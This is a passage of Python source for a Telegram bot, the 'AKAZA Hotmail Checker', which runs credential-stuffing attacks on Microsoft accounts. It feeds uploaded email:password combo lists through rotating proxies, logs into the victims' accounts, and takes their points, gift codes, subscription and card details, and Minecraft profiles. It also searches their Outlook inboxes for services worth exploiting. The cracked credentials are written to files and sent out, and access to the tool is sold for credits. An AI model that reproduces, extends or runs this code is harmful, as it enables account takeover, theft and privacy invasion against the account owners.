            if not xbl_token or not userhash: return {'owned': False}
            xsts = self.session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbl_token]},
                    'RelyingParty': 'rp://api.minecraftservices.com/',
                    'TokenType': 'JWT'
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10, verify=False
            ).json()
            xsts_token = xsts.get('Token')
            if not xsts_token: return {'owned': False}
            mca = self.session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': 'XBL3.0 x=' + userhash + ';' + xsts_token},
                headers={'Content-Type': 'application/json'},
                timeout=10, verify=False
            ).json()
            mc_token = mca.get('access_token')
            if not mc_token: return {'owned': False}
            prof = self.session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': 'Bearer ' + mc_token},
                timeout=10, verify=False
            )
            if prof.status_code == 200:
                pd = prof.json()
                return {
                    'owned': True,
                    'username': pd.get('name', 'Unknown'),
                    'uuid': pd.get('id', ''),
                    'capes': [cp.get('alias','') for cp in pd.get('capes', [])]
                }
        except Exception: pass
        return {'owned': False}

    # ── INBOX SCAN (batched) ──
    def scan_inbox(self, access_token, cid, user_keywords):
        found = {}
        try:
            hdrs = {
                'Authorization': 'Bearer ' + access_token,
                'X-AnchorMailbox': 'CID:' + cid,
                'User-Agent': 'Outlook-Android/2.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            }
            all_kws = list(dict.fromkeys(list(SERVICE_KEYWORDS.keys()) + (user_keywords or [])))
            BATCH = 8
            for i in range(0, len(all_kws), BATCH):
                batch = all_kws[i:i+BATCH]
                or_q = ' OR '.join('"' + kw + '"' for kw in batch)
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]},
                        'From': 0,
                        'Query': {'QueryString': or_q},
                        'Size': 5,
                        'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]
                    }]
                }
                try:
                    r = self.session.post(
                        'https://outlook.live.com/search/api/v2/query',
                        json=payload, headers=hdrs, timeout=8, verify=False)
                    d = r.json()
                    er = d.get('EntitySets', [{}])[0]
                    rs = er.get('ResultSets', [{}])[0]
                    if rs.get('Total', 0) > 0:
                        for kw in batch:
                            try:
                                p2 = {
                                    'Cvid': str(uuid.uuid4()),
                                    'Scenario': {'Name': 'owa.react'},
                                    'TimeZone': 'UTC',
                                    'TextDecorations': 'Off',
                                    'EntityRequests': [{
                                        'EntityType': 'Conversation',
                                        'ContentSources': ['Exchange'],
                                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]},
                                        'From': 0,
                                        'Query': {'QueryString': '"' + kw + '"'},
                                        'Size': 3,
                                        'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]
                                    }]
                                }
                                r2 = self.session.post(
                                    'https://outlook.live.com/search/api/v2/query',
                                    json=p2, headers=hdrs, timeout=6, verify=False)
                                d2 = r2.json()
                                cnt = d2.get('EntitySets',[{}])[0].get('ResultSets',[{}])[0].get('Total', 0)
                                if cnt > 0:
                                    disp = SERVICE_KEYWORDS.get(kw, kw)
                                    found[disp] = found.get(disp, 0) + cnt
                            except Exception: pass
                except Exception: pass
        except Exception as e:
            logger.debug('Inbox scan error: %s', e)
        return found

    # ── FULL CHECK ──
    def check(self, email, password, user_keywords=None, fast_mode=False):
        result = {'email': email, 'password': password, 'status': 'bad'}
        try:
            urlpost, ppft = self.get_sftag()
            if not urlpost:
                result['status'] = 'error'
                return result
            status, token = self.do_login(email, password, urlpost, ppft)
            if status == 'BAD': return result
            if status == '2FA':
                result['status'] = '2fa'
                return result
            if status != 'TOKEN' or not token:
                result['status'] = 'error'
                return result
            access_token = token
            cid = ''
            for ck in self.session.cookies:
                if ck.name == 'MSPCID':
                    cid = ck.value.upper()
                    break
            result['status'] = 'hit'
            result['pts']     = self.get_points()
            result['codes']   = self.get_codes()
            result['name'], result['country'] = self.get_profile(access_token, cid)
            if not fast_mode:
                result['subs']  = self.get_subs()
                result['mc']    = self.get_minecraft(access_token)
                result['inbox'] = self.scan_inbox(access_token, cid, user_keywords or [])
            else:
                result['subs']  = {'status': 'FREE', 'subs': [], 'balance': '', 'card': ''}
                result['mc']    = {'owned': False}
                result['inbox'] = {}
        except Exception as e:
            logger.debug('Check error %s: %s', email, e)
            result['status'] = 'error'
        return result


# ============================================================================
# HELPER — build hit message block (no backslash in f-string)
# ============================================================================
def build_hit_msg(data, for_user=True):
    pts    = data.get('pts', 0)
    codes  = data.get('codes', [])
    subs   = data.get('subs', {})
    mc     = data.get('mc', {})
    inbox  = data.get('inbox', {})
    active_subs = [s['name'] for s in subs.get('subs', []) if not s.get('expired')]

    tier = '💎 ULTRA HIT' if pts >= 20000 else ('⭐ PREMIUM HIT' if pts >= 7000 else '🎯 HIT')

    lines = [
        tier,
        '━━━━━━━━━━━━━━━━━━━━━',
        '📧 Email:    `' + data['email'] + '`',
        '🔑 Pass:     `' + data['password'] + '`',
        '👤 Name:     ' + data.get('name','N/A'),
        '🌍 Country:  ' + data.get('country','N/A'),
        '⭐ Points:   `' + '{:,}'.format(pts) + '`',
    ]

    if codes:
        lines.append('━━━━━━━━━━━━━━━━━━━━━')
        lines.append('🎮 *Codes (' + str(len(codes)) + '):*')
        cat_map = {}
        for cd in codes:
            cat_map.setdefault(cd.get('category','Unknown'), []).append(cd)
        for cat, clist in cat_map.items():
            lines.append('  📦 ' + cat + ':')
            for cd in clist:
                lines.append('    • `' + cd['code'] + '`')
                lines.append('      ' + cd.get('info',''))
                if cd.get('redemption_url'):
                    lines.append('      🔗 ' + cd['redemption_url'])

    if active_subs:
        lines.append('━━━━━━━━━━━━━━━━━━━━━')
        lines.append('🎮 *Subscriptions:*')
        for s in active_subs:
            lines.append('  • ' + s)
    if subs.get('balance'):
        lines.append('💳 Balance: `' + subs['balance'] + '`')

    if mc.get('owned'):
        capes = ', '.join(mc.get('capes', [])) or 'None'
        lines.append('━━━━━━━━━━━━━━━━━━━━━')
        lines.append('⛏️ *Minecraft:* `' + mc['username'] + '`')
        lines.append('   Capes: ' + capes)

    if inbox:
        lines.append('━━━━━━━━━━━━━━━━━━━━━')
        lines.append('📬 *Inbox Services (' + str(len(inbox)) + '):*')
        for svc, cnt in list(inbox.items())[:10]:
            lines.append('  • ' + svc + ': `' + str(cnt) + '` emails')
        if len(inbox) > 10:
            lines.append('  _+' + str(len(inbox)-10) + ' more_')

    lines.append('━━━━━━━━━━━━━━━━━━━━━')
    lines.append('_' + TAG + '_')
    return '\n'.join(lines)


def build_admin_notify(uid, data, username=''):
    """Clean admin notification — no floating hit window, just a summary."""
    pts   = data.get('pts', 0)
    codes = data.get('codes', [])
    subs  = data.get('subs', {})
    mc    = data.get('mc', {})
    inbox = data.get('inbox', {})
    active_subs = [s['name'] for s in subs.get('subs',[]) if not s.get('expired')]
    tier  = '💎 ULTRA' if pts >= 20000 else ('⭐ PREMIUM' if pts >= 7000 else '🎯 HIT')

    lines = [
        '📊 *New Hit Report*',
        '━━━━━━━━━━━━━━━━━━━━━',
        '👤 User: `' + str(uid) + '`' + (' (@' + username + ')' if username else ''),
        '📧 `' + data['email'] + '`',
        '🌍 ' + data.get('country','N/A') + ' | ' + tier,
        '⭐ Pts: `' + '{:,}'.format(pts) + '` | 🎮 Codes: `' + str(len(codes)) + '`',
        '📬 Inbox: `' + str(len(inbox)) + '` services',
        '🎮 Subs: ' + (', '.join(active_subs) if active_subs else 'None'),
        '⛏️ Minecraft: ' + (mc.get('username','') if mc.get('owned') else 'No'),
        '_' + TAG + '_',
    ]
    return '\n'.join(lines)


# ============================================================================
# KEYBOARDS
# ============================================================================
def main_kb(uid):
    kb = [
        [InlineKeyboardButton("🔍 Start Checking", callback_data="check"),
         InlineKeyboardButton("⚙️ Settings",        callback_data="settings")],
        [InlineKeyboardButton("📊 My Stats",         callback_data="stats"),
         InlineKeyboardButton("🌐 Proxies",          callback_data="proxies")],
        [InlineKeyboardButton("📖 All Commands",     callback_data="cmds")],
    ]
    if db.is_mod(uid):
        kb.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin")])
    kb.append([InlineKeyboardButton("ℹ️ " + TAG, callback_data="tag")])
    return InlineKeyboardMarkup(kb)

BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])


# ============================================================================
# /start
# ============================================================================
async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if db.is_banned(uid): return
    creds    = db.get_credits(uid)
    cr_txt   = '♾️ Unlimited' if uid == ADMIN_ID else '`' + str(creds) + '`'
    acc_txt  = '✅ Active' if db.has_access(uid) else '❌ No Access'
    fm_txt   = '⚡ Fast' if user_fast_mode.get(uid) else '🔬 Full'
    msg = (
        '🔥 *AKAZA Hotmail Checker*\n'
        '━━━━━━━━━━━━━━━━━━━━━\n'
        '👤 User ID:  `' + str(uid) + '`\n'
        '💰 Credits:  ' + cr_txt + '\n'
        '🔑 Access:   ' + acc_txt + '\n'
        '🌐 Proxies:  `' + str(len(PROXIES_LIST)) + '`\n'
        '⚡ Mode:     ' + fm_txt + '\n'
        '━━━━━━━━━━━━━━━━━━━━━\n'
        '_' + TAG + '_'
    )
    kb = main_kb(uid)
    if u.callback_query:
        try: await u.callback_query.edit_message_text(msg, parse_mode='Markdown', reply_markup=kb)
        except Exception: pass
    else:
        await u.message.reply_text(msg, parse_mode='Markdown', reply_markup=kb)


# ============================================================================
# Callback handler
# ============================================================================
async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    uid = q.from_user.id
    await q.answer()

    if q.data == "back":
        await start(u, c); return

    if q.data == "tag":
        await q.edit_message_text(
            '*' + TAG + '*\n\nThis bot is exclusively for ' + TAG + ' members.\nContact the admin to get access.',
            parse_mode='Markdown', reply_markup=BACK_KB); return

    if q.data == "check":
        await q.edit_message_text(
            '📝 *How to Use*\n\n'
            '1️⃣ Upload a `.txt` file with `email:password` combos\n'
            '2️⃣ Or paste combos directly (one per line)\n'
            '3️⃣ To load proxies: upload `.txt` with caption `proxy`\n\n'
            '⚡ Toggle speed mode: /fastmode\n'
            '⚙️ Configure threads: /threads N\n'
            '🔑 Set keywords: /keywords w1,w2',
            parse_mode='Markdown', reply_markup=BACK_KB); return

    if q.data == "settings":
        s      = db.get_settings(uid)
        kws    = ', '.join(s['keywords']) if s['keywords'] else 'None set'
        fm_txt = '⚡ Fast Mode (points+codes only)' if user_fast_mode.get(uid) else '🔬 Full Mode (all captures)'
        await q.edit_message_text(
            '⚙️ *Your Settings*\n\n'
            '🔢 Threads:  `' + str(s['threads']) + '`\n'
            '🔑 Keywords: `' + kws + '`\n'
            '📡 Mode:     ' + fm_txt + '\n\n'
            '*Commands:*\n'
            '`/threads 1-300`     — set threads\n'
            '`/keywords w1,w2`    — set keywords\n'
            '`/addkw word`        — add keyword\n'
            '`/clearkw`           — clear keywords\n'
            '`/fastmode`          — toggle mode',
            parse_mode='Markdown', reply_markup=BACK_KB); return

    if q.data == "stats":
        s    = db.user_stats(uid)
        info = db.get_user_info(uid)
        exp  = (info.get('access_expiry','') or '')[:10] if info else ''
        exp_line = ('\n📅 Expiry: `' + exp + '`') if exp else ''
        await q.edit_message_text(
            '📊 *Your Statistics*\n\n'
            '💰 Credits:  `' + ('Unlimited' if uid == ADMIN_ID else str(s['credits'])) + '`\n'
            '🔍 Checks:   `' + str(s['checks']) + '`\n'
            '🎯 Hits:     `' + str(s['hits']) + '`\n'
            '🌐 Proxies:  `' + str(len(PROXIES_LIST)) + '`' + exp_line + '\n\n'
            '_' + TAG + '_',
            parse_mode='Markdown', reply_markup=BACK_KB); return

    if q.data == "proxies":
        await q.edit_message_text(
            '🌐 *Proxy Manager*\n\n'
            'Loaded: `' + str(len(PROXIES_LIST)) + '` proxies\n\n'
            '*To load proxies:*\n'
            'Upload a `.txt` file with caption `proxy`\n\n'
            '*Supported formats:*\n'
            '`ip:port`\n'
            '`ip:port:user:pass`\n'
            '`http://ip:port`\n'
            '`socks5://ip:port`',
            parse_mode='Markdown', reply_markup=BACK_KB); return

    if q.data == "cmds":
        await q.edit_message_text(
            '📖 *All Commands*\n\n'
            '*User:*\n'
            '`/start`              — main menu\n'
            '`/stats`              — your stats\n'
            '`/threads N`          — set threads (1-300)\n'
            '`/keywords w1,w2`     — set inbox keywords\n'
            '`/addkw word`         — add one keyword\n'
            '`/clearkw`            — clear all keywords\n'
            '`/fastmode`           — toggle fast/full mode\n'
            '`/check email:pass`   — single account check\n\n'
            '*Admin (prefix `!!`):*\n'
            '`!!help`              — admin commands list\n'
            '`!!addcredits uid n`  — add credits\n'
            '`!!grant uid`         — permanent access\n'
            '`!!addaccess uid d`   — timed access (days)\n'
            '`!!ban uid`           — ban user\n'
            '`!!info uid`          — user details\n'
            '`!!stats`             — global stats\n'
            '`!!broadcast msg`     — message all users',
            parse_mode='Markdown', reply_markup=BACK_KB); return

    if q.data == "admin":
        if not db.is_mod(uid): return
        s     = db.global_stats()
        mods  = db.list_mods()
        ml    = ', '.join(['@' + (m['username'] or str(m['uid'])) for m in mods]) or 'None'
        users = db.get_all_users_preview()
        top_lines = []
        for row in users[:5]:
            top_lines.append(
                '  `' + str(row[0]) + '` @' + (row[1] or 'N/A') +
                ' | cr:' + str(row[2]) +
                ' | hits:' + str(row[5])
            )
        top_txt = '\n'.join(top_lines) if top_lines else '  None'
        await q.edit_message_text(
            '🛠 *Admin Panel*\n\n'
            '👥 Total Users:  `' + str(s['total']) + '`\n'
            '✅ Active:       `' + str(s['active']) + '`\n'
            '🔍 Total Checks: `' + str(s['checks']) + '`\n'
            '🎯 Total Hits:   `' + str(s['hits']) + '`\n'
            '🌐 Proxies:      `' + str(len(PROXIES_LIST)) + '`\n\n'
            '🛡 Mods: ' + ml + '\n\n'
            '📋 *Top Users (by hits):*\n' + top_txt + '\n\n'
            'Use `!!help` for all admin commands',
            parse_mode='Markdown', reply_markup=BACK_KB); return


# ============================================================================
# Proxy upload
# ============================================================================
async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    try:
        f = await c.bot.get_file(u.message.document.file_id)
        content = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
        global PROXIES_LIST
        PROXIES_LIST = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
        await u.message.reply_text(
            '✅ *Proxies Loaded*\n\n'
            '📡 Count: `' + str(len(PROXIES_LIST)) + '`\n'
            '💡 Threads will auto-scale with proxies active.',
            parse_mode='Markdown')
    except Exception as e:
        await u.message.reply_text('❌ Error loading proxies: `' + str(e) + '`', parse_mode='Markdown')


# ============================================================================
# Combo check handler
# ============================================================================
async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid): return
    if not db.has_access(uid):
        await u.message.reply_text(
            '❌ *No Access*\n\nContact ' + TAG + ' to get access.',
            parse_mode='Markdown'); return

    credits = db.get_credits(uid)
    if credits <= 0 and uid != ADMIN_ID:
        await u.message.reply_text(
            '❌ *No Credits*\n\nContact ' + TAG + ' to get credits.',
            parse_mode='Markdown'); return

    if u.message.document:
        try:
            f = await c.bot.get_file(u.message.document.file_id)
            content = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
        except Exception:
            await u.message.reply_text('❌ Failed to download file.'); return
    else:
        content = u.message.text or ''

    lines = [l.strip() for l in content.split('\n') if ':' in l]
    lines = [l for l in lines if not l.startswith('!!')]
    if not lines: return

    if uid != ADMIN_ID and credits < len(lines):
        await u.message.reply_text(
            '❌ Not enough credits.\n'
            'Have: `' + str(credits) + '` | Need: `' + str(len(lines)) + '`',
            parse_mode='Markdown'); return

    settings = db.get_settings(uid)
    threads  = min(settings['threads'], 10 if not PROXIES_LIST else 300)
    fm       = user_fast_mode.get(uid, False)
    keywords = settings['keywords']

    ts         = int(time.time())
    hits_file  = TAG + '_hits_' + str(uid) + '_' + str(ts) + '_' + TAG + '.txt'
    codes_file = TAG + '_codes_' + str(uid) + '_' + str(ts) + '_' + TAG + '.txt'
    kw_file    = TAG + '_inbox_' + str(uid) + '_' + str(ts) + '_' + TAG + '.txt'
    tfa_file   = TAG + '_2fa_' + str(uid) + '_' + str(ts) + '_' + TAG + '.txt'

    status_msg = await u.message.reply_text(
        '⚡ *AKAZA Engine Starting*\n\n'
        '━━━━━━━━━━━━━━━━━━━━━\n'
        '📋 Combos:   `' + str(len(lines)) + '`\n'
        '🔢 Threads:  `' + str(threads) + '`\n'
        '🌐 Proxies:  `' + str(len(PROXIES_LIST)) + '`\n'
        '📡 Mode:     `' + ('Fast' if fm else 'Full') + '`\n'
        '━━━━━━━━━━━━━━━━━━━━━\n'
        '_' + TAG + '_',
        parse_mode='Markdown')

    hits = bad = tfa = errors = checked = 0
    start_time  = time.time()
    last_hits   = []
    last_update = 0
    update_lock = asyncio.Lock()

    def run_check(line):
        try:
            parts = line.split(':', 1)
            if len(parts) != 2: return None
            e, p = parts[0].strip(), parts[1].strip()
            proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
            return AkazaChecker(proxy=proxy).check(e, p, keywords, fast_mode=fm)
        except Exception: return None

    loop = asyncio.get_running_loop()
    sem  = asyncio.Semaphore(threads)

    username_cache = u.effective_user.username or ''

    async def sem_worker(line):
        nonlocal hits, bad, tfa, errors, checked, last_update
        async with sem:
            data = await loop.run_in_executor(bot_executor, run_check, line)
            if not data:
                errors += 1; checked += 1; return
            checked += 1
            db.use_credit(uid)
            st = data.get('status', 'bad')

            if st == 'hit':
                hits += 1
                db.add_hit(uid)
                db.save_result(uid, data['email'], 'hit', data)

                pts         = data.get('pts', 0)
                codes       = data.get('codes', [])
                subs        = data.get('subs', {})
                mc          = data.get('mc', {})
                inbox       = data.get('inbox', {})
                active_subs = [s['name'] for s in subs.get('subs',[]) if not s.get('expired')]

                # Send hit to user
                user_msg = build_hit_msg(data, for_user=True)
                try:
                    await c.bot.send_message(uid, user_msg, parse_mode='Markdown',
                                             disable_web_page_preview=True)
                except Exception: pass

                # Send clean summary to admin (not the full hit window)
                if uid != ADMIN_ID:
                    admin_msg = build_admin_notify(uid, data, username_cache)
                    try:
                        await c.bot.send_message(ADMIN_ID, admin_msg,
                                                 parse_mode='Markdown',
                                                 disable_web_page_preview=True)
                    except Exception: pass

                # Track last hits
                last_hits.append(data['email'])
                if len(last_hits) > 5: last_hits.pop(0)

                # ── HITS FILE ──
                sep = '=' * 42
                mc_line = mc.get('username','') if mc.get('owned') else 'No'
                subs_line = ', '.join(active_subs) if active_subs else 'None'
                hit_block = (
                    TAG + '\n' +
                    'Email:    ' + data['email'] + '\n' +
                    'Password: ' + data['password'] + '\n' +
                    'Name:     ' + data.get('name','N/A') + '\n' +
                    'Country:  ' + data.get('country','N/A') + '\n' +
                    'Points:   ' + str(pts) + '\n' +
                    'Subs:     ' + subs_line + '\n' +
                    'Minecraft:' + mc_line + '\n' +
                    sep + '\n\n'
                )
                with open(hits_file, 'a', encoding='utf-8') as hf:
                    hf.write(hit_block)

                # ── CODES FILE ──
                if codes:
                    with open(codes_file, 'a', encoding='utf-8') as cf:
                        cf.write(TAG + '\n')
                        cf.write('Email: ' + data['email'] + '\n')
                        for cd in codes:
                            cf.write(
                                'Code: '     + cd['code'] +
                                ' | Cat: '   + cd.get('category','') +
                                ' | Info: '  + cd.get('info','') +
                                ' | Redeem: '+ (cd.get('redemption_url') or 'N/A') + '\n'
                            )
                        cf.write(sep + '\n\n')

                # ── INBOX FILE ──
                if inbox:
                    with open(kw_file, 'a', encoding='utf-8') as kf:
                        kf.write(TAG + '\n')
                        kf.write('Email: ' + data['email'] + '\n')
                        for svc, cnt in inbox.items():
                            kf.write('  ' + svc + ': ' + str(cnt) + ' emails\n')
                        kf.write(sep + '\n\n')

            elif st == '2fa':
                tfa += 1
                with open(tfa_file, 'a', encoding='utf-8') as tf:
                    tf.write(data['email'] + ':' + data['password'] + '\n')
            elif st == 'error':
                errors += 1
            else:
                bad += 1

            # ── LIVE PROGRESS UPDATE (every 2s) ──
            async with update_lock:
                now = time.time()
                if now - last_update > 2.0 or checked == len(lines):
                    last_update = now
                    el  = now - start_time
                    cpm = int((checked / el) * 60) if el > 0 else 0
                    pct = round((checked / len(lines)) * 100, 1) if lines else 0
                    lh_str = ' | '.join(last_hits) if last_hits else 'None yet'
                    prg = (
                        '⚡ *AKAZA Live Check*\n'
                        '━━━━━━━━━━━━━━━━━━━━━\n'
                        '📊 Progress: `' + str(checked) + '/' + str(len(lines)) + '` (' + str(pct) + '%)\n'
                        '🎯 Hits:     `' + str(hits) + '`\n'
                        '💀 Bad:      `' + str(bad) + '`\n'
                        '🔒 2FA:      `' + str(tfa) + '`\n'
                        '❌ Errors:   `' + str(errors) + '`\n'
                        '⚡ CPM:      `' + str(cpm) + '`\n'
                        '⏱ Time:     `' + str(int(el)) + 's`\n'
                        '━━━━━━━━━━━━━━━━━━━━━\n'
                        '🕒 *Last Hits:*\n'
                        '`' + lh_str + '`\n'
                        '_' + TAG + '_'
                    )
                    try: await status_msg.edit_text(prg, parse_mode='Markdown')
                    except Exception: pass

    await asyncio.gather(*(sem_worker(l) for l in lines))

    # Final summary
    el        = time.time() - start_time
    cpm_final = int((checked / el) * 60) if el > 0 else 0
    summary = (
        '✅ *Check Complete*\n'
        '━━━━━━━━━━━━━━━━━━━━━\n'
        '📋 Checked:  `' + str(checked) + '`\n'
        '🎯 Hits:     `' + str(hits) + '`\n'
        '💀 Bad:      `' + str(bad) + '`\n'
        '🔒 2FA:      `' + str(tfa) + '`\n'
        '❌ Errors:   `' + str(errors) + '`\n'
        '⚡ Avg CPM:  `' + str(cpm_final) + '`\n'
        '⏱ Duration: `' + str(int(el)) + 's`\n'
        '━━━━━━━━━━━━━━━━━━━━━\n'
        '_' + TAG + '_'
    )
    try: await status_msg.edit_text(summary, parse_mode='Markdown')
    except Exception: pass

    # Send result files
    for fpath, caption in [
        (hits_file,  '🎯 Hits — ' + TAG),
        (codes_file, '🎮 Codes — ' + TAG),
        (kw_file,    '📬 Inbox Results — ' + TAG),
        (tfa_file,   '🔒 2FA Accounts — ' + TAG),
    ]:
        if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
            try:
                with open(fpath, 'rb') as fh:
                    await u.message.reply_document(fh, caption=caption)
            except Exception: pass
            try: os.remove(fpath)
            except Exception: pass


# ============================================================================
# /check single
# ============================================================================
async def single_check_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid): return
    if not c.args:
        await u.message.reply_text('Usage: `/check email:password`', parse_mode='Markdown'); return
    line = c.args[0]
    if ':' not in line:
        await u.message.reply_text('❌ Format: `email:password`', parse_mode='Markdown'); return
    msg = await u.message.reply_text('🔄 *Checking...*', parse_mode='Markdown')
    fm  = user_fast_mode.get(uid, False)
    s   = db.get_settings(uid)
    def do():
        proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
        e, p  = line.split(':', 1)
        return AkazaChecker(proxy=proxy).check(e.strip(), p.strip(), s['keywords'], fast_mode=fm)
    loop = asyncio.get_running_loop()
    data = await loop.run_in_executor(bot_executor, do)
    st   = data.get('status', 'bad')
    if st == 'hit':
        db.use_credit(uid)
        db.add_hit(uid)
        result = build_hit_msg(data, for_user=True)
    elif st == '2fa':
        result = '🔒 *2FA Account*\n`' + line + '`\n_' + TAG + '_'
    elif st == 'error':
        result = '❌ *Error checking account*\n_' + TAG + '_'
    else:
        result = '💀 *Bad Account*\n_' + TAG + '_'
    try: await msg.edit_text(result, parse_mode='Markdown', disable_web_page_preview=True)
    except Exception: pass


# ============================================================================
# User commands
# ============================================================================
async def cmd_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    try:
        t = max(1, min(int(c.args[0]), 300))
        db.update_settings(uid, threads=t)
        await u.message.reply_text('✅ Threads set to `' + str(t) + '`', parse_mode='Markdown')
    except Exception:
        await u.message.reply_text('Usage: `/threads 10`', parse_mode='Markdown')

async def cmd_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    if c.args:
        kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]
        db.update_settings(uid, keywords=kws)
        await u.message.reply_text('✅ Keywords: `' + ', '.join(kws) + '`', parse_mode='Markdown')
    else:
        await u.message.reply_text('Usage: `/keywords netflix,paypal,steam`', parse_mode='Markdown')

async def cmd_addkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    if c.args:
        kw  = c.args[0].strip()
        s   = db.get_settings(uid)
        kws = s['keywords']
        if kw not in kws: kws.append(kw)
        db.update_settings(uid, keywords=kws)
        await u.message.reply_text('✅ Added: `' + kw + '`', parse_mode='Markdown')

async def cmd_clearkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    db.update_settings(uid, keywords=[])
    await u.message.reply_text('✅ Keywords cleared.', parse_mode='Markdown')

async def cmd_fastmode(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.has_access(uid): return
    user_fast_mode[uid] = not user_fast_mode.get(uid, False)
    mode = '⚡ Fast Mode' if user_fast_mode[uid] else '🔬 Full Mode'
    desc = ('Points + codes only — higher CPM' if user_fast_mode[uid]
            else 'All captures: points, codes, subs, Minecraft, inbox scan')
    await u.message.reply_text(
        '✅ Switched to *' + mode + '*\n\n' + desc,
        parse_mode='Markdown')

async def cmd_stats(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid  = u.effective_user.id
    s    = db.user_stats(uid)
    info = db.get_user_info(uid)
    exp  = (info.get('access_expiry','') or '')[:10] if info else ''
    await u.message.reply_text(
        '📊 *Your Statistics*\n\n'
        '💰 Credits:  `' + ('Unlimited' if uid == ADMIN_ID else str(s['credits'])) + '`\n'
        '🔍 Checks:   `' + str(s['checks']) + '`\n'
        '🎯 Hits:     `' + str(s['hits']) + '`\n'
        '🌐 Proxies:  `' + str(len(PROXIES_LIST)) + '`\n'
        '⚡ Mode:     `' + ('Fast' if user_fast_mode.get(uid) else 'Full') + '`\n'
        + ('📅 Expiry: `' + exp + '`\n' if exp else '') +
        '\n_' + TAG + '_',
        parse_mode='Markdown')


# ============================================================================
# Admin commands
# ============================================================================
async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.is_mod(uid): return
    txt = u.message.text or ''
    if not txt.startswith('!!'): return

    async def reply(msg):
        await u.message.reply_text(msg, parse_mode='Markdown')

    try:
        parts = txt.split(None, 3)
        cmd   = parts[0][2:].lower()

        if cmd == 'help':
            await reply(
                '🛠 *Admin Commands*\n\n'
                '`!!addcredits [uid] [n]`   — add credits\n'
                '`!!setcredits [uid] [n]`   — set credits\n'
                '`!!resetcredits [uid]`     — reset to 0\n'
                '`!!credits [uid]`          — view credits\n'
                '`!!grant [uid]`            — permanent access\n'
                '`!!revoke [uid]`           — remove access\n'
                '`!!addaccess [uid] [days]` — timed access\n'
                '`!!ban [uid]`              — ban user\n'
                '`!!unban [uid]`            — unban user\n'
                '`!!mod [uid]`              — make mod _(owner)_\n'
                '`!!unmod [uid]`            — remove mod _(owner)_\n'
                '`!!info [uid]`             — user info\n'
                '`!!stats`                  — global stats\n'
                '`!!listmods`               — list mods\n'
                '`!!broadcast [msg]`        — message all users\n'
                '`!!setthreads [uid] [n]`   — set threads for user'
            )
        elif cmd == 'addcredits' and len(parts) >= 3:
            target, amt = int(parts[1]), int(parts[2])
            db.add_credits(target, amt)
            await reply('✅ Added `' + str(amt) + '` credits to `' + str(target) + '`')
        elif cmd == 'setcredits' and len(parts) >= 3:
            target, amt = int(parts[1]), int(parts[2])
            db.set_credits(target, amt)
            await reply('✅ Set credits to `' + str(amt) + '` for `' + str(target) + '`')
        elif cmd == 'resetcredits' and len(parts) >= 2:
            target = int(parts[1])
            db.reset_credits(target)
            await reply('✅ Reset credits for `' + str(target) + '`')
        elif cmd == 'credits' and len(parts) >= 2:
            target = int(parts[1])
            await reply('💰 User `' + str(target) + '` has `' + str(db.get_credits(target)) + '` credits')
        elif cmd == 'grant' and len(parts) >= 2:
            target = int(parts[1])
            db.add_user(target, '', '')
            db.grant_access(target)
            await reply('✅ Granted permanent access to `' + str(target) + '`')
        elif cmd == 'revoke' and len(parts) >= 2:
            target = int(parts[1])
            db.revoke_access(target)
            await reply('✅ Revoked access for `' + str(target) + '`')
        elif cmd == 'addaccess' and len(parts) >= 3:
            target, days = int(parts[1]), int(parts[2])
            db.add_user(target, '', '')
            db.grant_timed(target, days)
            await reply('✅ Granted `' + str(days) + '` days access to `' + str(target) + '`')
        elif cmd == 'ban' and len(parts) >= 2:
            target = int(parts[1])
            db.ban(target)
            await reply('✅ Banned `' + str(target) + '`')
        elif cmd == 'unban' and len(parts) >= 2:
            target = int(parts[1])
            db.unban(target)
            await reply('✅ Unbanned `' + str(target) + '`')
        elif cmd == 'mod' and len(parts) >= 2:
            if uid != ADMIN_ID:
                await reply('❌ Owner only.'); return
            target = int(parts[1])
            db.add_user(target, '', '')
            db.set_mod(target, 1)
